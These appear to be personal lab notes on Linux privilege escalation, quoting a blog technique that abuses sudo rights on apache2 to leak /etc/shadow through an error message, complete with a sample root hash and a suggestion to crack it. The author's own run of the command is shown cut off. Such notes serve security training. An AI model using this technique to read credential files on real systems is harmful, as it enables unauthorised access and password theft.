we know theres apache so look up

`apache 2 privilege escalation `

https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/

the link above was what popped up for him

so lets read it 

```
### **Using apache Command**

sadly u cant get Shell and Cant edit system files.

but using this u can view system files.

sudo apache2 -f /etc/shadow

Output is like this :

Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration

Sadly no Shell. But you manage to extract root hash now Crack hash in your machine. For Shadow Cracking click here for more.
```


so, we can probably read the shadow file!


```
TCM@debian:~$ sudo /usr/sbin/apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:

cluded in the server configuration
